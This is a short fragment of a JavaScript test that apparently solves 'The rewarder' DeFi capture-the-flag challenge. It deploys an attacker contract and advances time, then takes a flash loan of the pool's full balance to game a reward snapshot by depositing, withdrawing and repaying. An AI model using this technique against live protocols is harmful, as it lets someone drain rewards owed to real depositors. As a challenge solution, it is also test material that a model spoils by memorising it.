...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        const rewarderAttacker = await RewarderAttacker.deploy(
            this.flashLoanPool.address,
            this.rewarderPool.address,
            this.liquidityToken.address,
            this.rewardToken.address
        )
        // Advance time 5 days . Use flashloan to a get snapshot with total flashloan balance
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days

        //Call flashloan with total balance from flashloan
        // Deposit to rewarder pool
        // Withdraw from pool
        //Return flashloan 
        const flashloanPoolBalance = await this.liquidityToken.balanceOf(this.flashLoanPool.address)
        await rewarderAttacker.getFlashLoan(flashloanPoolBalance)
    });
